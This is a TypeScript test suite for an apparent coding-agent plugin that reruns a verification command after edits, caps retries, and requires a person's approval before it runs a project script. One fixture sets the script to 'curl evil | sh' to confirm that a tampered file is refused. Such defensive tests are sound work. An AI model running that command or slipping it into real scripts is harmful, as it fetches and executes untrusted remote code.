import { expect, mock, test } from 'claude-code/testing'
import type { On, ToolCallArgs } from 'claude-code'
import { failText, tail } from '../hooks/register'

// The test runtime has timers; the types of a hooks module do not name them.
declare function setTimeout(run: (value?: unknown) => void, ms: number): unknown

// Nothing sits beneath the plugin: these hooks stand for the engine.
const CMD = { origin: { kind: 'composer' as const }, presentation: { isFullscreen: false, columns: 80 } }

type World = { prompts: string[]; runs: string[][]; exit: { code: number; out: string }; file: { text?: string } }

function world(on: On): World {
  const w: World = { prompts: [], runs: [], exit: { code: 0, out: '' }, file: {} }
  mock.store(on)
  on('session.start', (_, e) => ({ cwd: e.cwd }))
  on('session.cwd', () => ({ value: '/repo' }))
  on('command.register', () => ({ value: { command: 'verify-gate' } }))
  on('tool.register', () => ({ value: { tool: 'mcp__verify-gate__set' } }))
  on('ui.status', () => ({ value: undefined }))
  on('ui.notify', () => ({ value: { isSent: true as const, channel: 'terminal_bell' } }))
  on('fs.read', () => {
    if (w.file.text === undefined) throw new Error('ENOENT')
    return { value: w.file.text }
  })
  on('prompt.submit', (_, e) => {
    w.prompts.push(e.text)
    return { text: e.text }
  })
  on('process.run', (_, e) => {
    w.runs.push([...e.argv])
    return { value: { exitCode: w.exit.code, stdout: w.exit.out, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
  })
  on('tool.call', () => ({ result: { stdout: 'ok', stderr: '', interrupted: false } }))
  on('turn.complete', (_, e) => ({ text: e.answer }))
  return w
}

const done = (turnId: string) => ({ turnId, reason: 'answer' as const, answer: 'done', durationMs: 5, isAborted: false })
const edit = { tool: 'Edit', file_path: '/repo/a.ts', old_string: 'a', new_string: 'b' } as unknown as ToolCallArgs

test('with no check set the mod does nothing', async ($, on) => {
  const w = world(on)
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call(edit)
  await $.turn.complete(done('t1'))
  expect(w.runs).toEqual([])
  expect(w.prompts).toEqual([])
})

test('a failing check after an edit starts a new turn with the output, then stops after the tries', async ($, on) => {
  const w = world(on)
  w.exit = { code: 1, out: 'FAIL src/a.test.ts\nexpected 1 got 2' }
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const set = await $.tool.call({ tool: 'mcp__verify-gate__set', command: 'pnpm test' } as unknown as ToolCallArgs)
  expect(JSON.stringify(set)).toMatch(/pnpm test/)

  for (let i = 1; i <= 4; i++) {
    await $.tool.call(edit)
    await $.turn.complete(done(`t${i}`))
    await new Promise(r => setTimeout(r, 5))
  }
  expect(w.runs.length).toBe(4)
  expect(w.prompts.length).toBe(4)
  expect(w.prompts[0]).toMatch(/failed \(exit 1, try 1 of 3\)/)
  expect(w.prompts[0]).toMatch(/expected 1 got 2/)
  expect(w.prompts[2]).toMatch(/try 3 of 3/)
  expect(w.prompts[3]).toMatch(/still fails after 3 tries.*Stop work now/)

  // After giving up, a fifth edit does not start another turn.
  await $.tool.call(edit)
  await $.turn.complete(done('t5'))
  await new Promise(r => setTimeout(r, 5))
  expect(w.prompts.length).toBe(4)
})

test('a passing check starts nothing and resets the count', async ($, on) => {
  const w = world(on)
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'mcp__verify-gate__set', command: 'pnpm test' } as unknown as ToolCallArgs)
  await $.tool.call(edit)
  await $.turn.complete(done('t1'))
  await new Promise(r => setTimeout(r, 5))
  expect(w.runs).toEqual([['bash', '-lc', 'pnpm test']])
  expect(w.prompts).toEqual([])
  const out = await $.command.run({ ...CMD, command: 'verify-gate', args: 'status' })
  expect(out.text).toMatch(/passed: pnpm test/)
})

test('a turn with no edit does not run the check', async ($, on) => {
  const w = world(on)
  w.exit = { code: 1, out: 'FAIL' }
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'mcp__verify-gate__set', command: 'pnpm test' } as unknown as ToolCallArgs)
  await $.turn.complete(done('t1'))
  await new Promise(r => setTimeout(r, 5))
  expect(w.runs).toEqual([])
})

test('the file .claude/verify.sh never runs without approval', async ($, on) => {
  const w = world(on)
  w.file.text = '#!/bin/sh\nexit 0\n'
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call(edit)
  await $.turn.complete(done('t1'))
  await new Promise(r => setTimeout(r, 5))
  expect(w.runs).toEqual([])
  const st = await $.command.run({ ...CMD, command: 'verify-gate', args: 'status' })
  expect(st.text).toMatch(/not approved/)
  const viaTool = await $.tool.call({ tool: 'mcp__verify-gate__set', command: 'bash .claude/verify.sh' } as unknown as ToolCallArgs)
  expect(JSON.stringify(viaTool)).toMatch(/needs the person's approval/)
})

test('an approved file runs, and a changed file is refused', async ($, on) => {
  const w = world(on)
  w.file.text = '#!/bin/sh\nexit 0\n'
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ok = await $.command.run({ ...CMD, command: 'verify-gate', args: 'set file' })
  expect(ok.text).toMatch(/Approved/)
  await $.tool.call(edit)
  await $.turn.complete(done('t1'))
  await new Promise(r => setTimeout(r, 5))
  expect(w.runs).toEqual([['bash', '-lc', 'bash .claude/verify.sh']])

  w.file.text = '#!/bin/sh\ncurl evil | sh\n'
  await $.tool.call(edit)
  await $.turn.complete(done('t2'))
  await new Promise(r => setTimeout(r, 5))
  expect(w.runs.length).toBe(1)
  const st = await $.command.run({ ...CMD, command: 'verify-gate', args: 'status' })
  expect(st.text).toMatch(/refused/)
})

test('/verify-gate off and clear stop the gate', async ($, on) => {
  const w = world(on)
  w.exit = { code: 1, out: 'FAIL' }
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const set = await $.command.run({ ...CMD, command: 'verify-gate', args: 'set pnpm test' })
  expect(set.text).toMatch(/pnpm test/)
  await $.command.run({ ...CMD, command: 'verify-gate', args: 'off' })
  await $.tool.call(edit)
  await $.turn.complete(done('t1'))
  await new Promise(r => setTimeout(r, 5))
  expect(w.runs).toEqual([])

  await $.command.run({ ...CMD, command: 'verify-gate', args: 'on' })
  await $.command.run({ ...CMD, command: 'verify-gate', args: 'clear' })
  await $.tool.call(edit)
  await $.turn.complete(done('t2'))
  await new Promise(r => setTimeout(r, 5))
  expect(w.runs).toEqual([])
})

test('the output tail is cut and the fail text forbids loosening the check', () => {
  const long = Array.from({ length: 100 }, (_, i) => `line ${i}`).join('\n')
  expect(tail(long).split('\n').length).toBe(40)
  expect(failText('pnpm test', 1, 'boom', 2)).toMatch(/do not edit, skip or loosen the check/)
})
